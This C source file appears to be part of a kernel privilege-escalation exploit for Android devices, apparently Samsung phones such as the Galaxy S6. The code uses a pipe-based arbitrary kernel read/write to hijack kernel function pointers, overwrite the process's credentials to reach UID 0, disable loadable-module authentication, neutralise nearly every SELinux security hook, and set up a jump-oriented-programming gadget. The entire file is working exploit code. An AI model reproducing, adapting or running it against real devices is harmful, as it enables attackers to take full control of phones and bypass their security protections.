#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#include "getroot.h"
#include "offsets.h"
#include "threadinfo.h"
#include "sid.h"

#define __user
#define __kernel

#define QUOTE(str) #str
#define TOSTR(str) QUOTE(str)
#define ASMMAGIC (0xBEEFDEAD)

int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], address, len) != len)
		goto end;
	if(read(pipes[0], buf, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], buf, len) != len)
		goto end;
	if(read(pipes[0], address, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

inline int writel_at_address_pipe(void* address, unsigned long val)
{
	return write_at_address_pipe(address, &val, sizeof(val));
}

unsigned int execute_via_check_flags(int dev, void* check_flags, void* function, unsigned long arg) {
	unsigned int ret = 0;

	if(writel_at_address_pipe(check_flags, (unsigned long) function))
		return 1;

	ret = (unsigned)fcntl(dev, F_SETFL, arg);
	writel_at_address_pipe(check_flags, 0);

	return ret;
}

unsigned long execute_via_task_prctl(struct offsets* o, void* function, int arg0, unsigned long long arg1, unsigned long long arg2, unsigned long long arg3, unsigned long long arg4, unsigned long long arg5) {
	unsigned long ret = 0;

	if(writel_at_address_pipe(o->security_ops_prctl, (unsigned long) function))
		return 1;

	ret = (unsigned long) prctl(arg0, arg1, arg2, arg3, arg4, arg5);

	writel_at_address_pipe(o->security_ops_prctl, (unsigned long) o->cap_task_prctl);

	return ret;
}

int modify_task_cred_rkp(struct thread_info* __kernel info)
{
	unsigned int i;
	struct cred* __kernel cred = NULL;
	struct cred* __kernel real_cred = NULL;

	struct cred** cred_pointer_location = NULL;
	struct cred** real_cred_pointer_location = NULL;

	struct thread_info ti;

	struct task_struct_partial* __user tsp;
	struct task_struct_partial_parents* __user ptsp;
	
	pid_t pid = getpid();

	if(read_at_address_pipe(info, &ti, sizeof(ti)))
		return 1;

	printf(" [+] Found task at %p\n", ti.task);

	tsp = malloc(sizeof(*tsp));

	for(i = 0; i < 0x600; i+= sizeof(void*))
	{
		struct task_struct_partial* __kernel t = (struct task_struct_partial*) ((void*)ti.task + i);

		if(read_at_address_pipe(t, tsp, sizeof(*tsp)))
			break;

		if (is_cpu_timer_valid(&tsp->cpu_timers[0])
			&& is_cpu_timer_valid(&tsp->cpu_timers[1])
			&& is_cpu_timer_valid(&tsp->cpu_timers[2])
			&& (tsp->real_cred == tsp->cred)
			&& ((unsigned long)tsp->cred > KERNEL_START))
		{
			cred_pointer_location = (void*)ti.task + i + offsetof(struct task_struct_partial, cred);
			real_cred_pointer_location = (void*)ti.task + i + offsetof(struct task_struct_partial, real_cred);

			cred = tsp->cred;
			real_cred = tsp->real_cred;
			
			printf(" [+] Found cred struct at %p pointed by %p\n", cred, cred_pointer_location);
			printf(" [+] Found real_cred struct at %p pointed by %p\n", real_cred, real_cred_pointer_location);
			break;
		}
	}

	free(tsp);

	if(cred == NULL)
		return 1;

	ptsp = malloc(sizeof(*ptsp));

	for(i = 0; i < 0x600; i+= sizeof(void*))
	{
		struct task_struct_partial_parents* __kernel p = 	(struct task_struct_partial_parents*)	((void*)ti.task + i);

		if(read_at_address_pipe(p, ptsp, sizeof(*ptsp)))
			break;

		if ((ptsp->pid == pid) && (ptsp->tgid == pid)) {
			void* parent_backup = ptsp->parent;
			printf(" [+] Setting PID to 0\n");
			ptsp->pid = 0;
			ptsp->parent = NULL;
			write_at_address_pipe(p, ptsp, sizeof(*ptsp));
			
			setuid(0);
			printf(" [+] Set UID to 0, restoring PID\n");

			ptsp->pid = pid;
			ptsp->parent = parent_backup;
			write_at_address_pipe(p, ptsp, sizeof(*ptsp));

			read_at_address_pipe(cred_pointer_location, &cred, sizeof(cred));
			printf(" [+] task->cred is %p\n", cred);

			write_at_address_pipe(real_cred_pointer_location, &cred, sizeof(cred));
			read_at_address_pipe(real_cred_pointer_location, &real_cred, sizeof(real_cred));
			printf(" [+] task->real_cred is %p\n", real_cred);

		}

	}

	free(ptsp);

	return 0;
}

int disable_lkmauth(struct offsets *o) {
	int bootmode = 2; // BOOTMODE_RECOVERY
	write_at_address_pipe(o->lkmauth_bootmode, &bootmode, sizeof(bootmode));

	return 0;
}

int disable_selinux_hooks(struct offsets *o) {
	struct security_operations security_ops;

	read_at_address_pipe(o->security_ops, &security_ops, sizeof(security_ops));

	security_ops.bprm_check_security 	= o->security_ret_0;
	security_ops.bprm_committing_creds 	= o->security_void;
	security_ops.bprm_committed_creds 	= o->security_void;	

	security_ops.sb_statfs 				= o->security_ret_0;
	security_ops.sb_mount 				= o->security_ret_0;
	security_ops.sb_remount 			= o->security_ret_0;
	security_ops.sb_umount 				= o->security_ret_0;
	security_ops.sb_pivotroot 			= o->security_ret_0;

	security_ops.inode_create 			= o->security_ret_0;
	security_ops.inode_link 			= o->security_ret_0;
	security_ops.inode_unlink 			= o->security_ret_0;
	security_ops.inode_symlink 			= o->security_ret_0;
	security_ops.inode_mkdir 			= o->security_ret_0;
	security_ops.inode_rmdir 			= o->security_ret_0;
	security_ops.inode_mknod 			= o->security_ret_0;
	security_ops.inode_rename 			= o->security_ret_0;
	security_ops.inode_readlink 		= o->security_ret_0;
	security_ops.inode_follow_link 		= o->security_ret_0;
	security_ops.inode_permission 		= o->security_ret_0;
	security_ops.inode_setattr 			= o->security_ret_0;
	security_ops.inode_getattr 			= o->security_ret_0;
	security_ops.inode_setxattr 		= o->security_ret_0;
	security_ops.inode_post_setxattr 	= o->security_ret_0;
	security_ops.inode_getxattr 		= o->security_ret_0;
	security_ops.inode_listxattr 		= o->security_ret_0;
	security_ops.inode_removexattr 		= o->security_ret_0;
	security_ops.inode_need_killpriv 	= o->security_ret_0;
	
	security_ops.file_permission 		= o->security_ret_0;
	security_ops.file_ioctl 			= o->security_ret_0;
	security_ops.mmap_addr 				= o->security_ret_0;
	security_ops.mmap_file 				= o->security_ret_0;
	security_ops.file_mprotect 			= o->security_ret_0;
	security_ops.file_lock 				= o->security_ret_0;
	security_ops.file_fcntl 			= o->security_ret_0;
	security_ops.file_send_sigiotask 	= o->security_ret_0;
	security_ops.file_receive 			= o->security_ret_0;

	security_ops.task_create 			= o->security_ret_0;
	security_ops.kernel_module_from_file= o->security_ret_0;
	security_ops.task_setpgid 			= o->security_ret_0;
	security_ops.task_getpgid 			= o->security_ret_0;
	security_ops.task_getsid 			= o->security_ret_0;
	security_ops.task_setnice 			= o->security_ret_0;
	security_ops.task_setioprio 		= o->security_ret_0;
	security_ops.task_getioprio 		= o->security_ret_0;
	security_ops.task_setrlimit 		= o->security_ret_0;
	security_ops.task_setscheduler 		= o->security_ret_0;
	security_ops.task_getscheduler 		= o->security_ret_0;
	security_ops.task_movememory 		= o->security_ret_0;
	security_ops.task_kill 				= o->security_ret_0;
	
	security_ops.capable 				= o->security_ret_0;
	security_ops.syslog 				= o->security_ret_0;
	security_ops.settime 				= o->security_ret_0;
	security_ops.vm_enough_memory 		= o->security_ret_0;

	write_at_address_pipe(o->security_ops, &security_ops, sizeof(security_ops));
	
	return 0;
}

void preparejop(void** addr, void* jopret)
{
	unsigned int i;
	for(i = 0; i < (0x1000 / sizeof(int)); i++)
		((int*)addr)[i] = 0xDEAD;

/* Galaxy S6
0xffffffc0003e2b3c		020840f9		ldr x2, [x0, 0x10]
0xffffffc0003e2b40      a0830091  		add x0, x29, 0x20
0xffffffc0003e2b44      40003fd6  		blr x2
*/
	addr[2] = jopret; //[x0, 0x10]
}
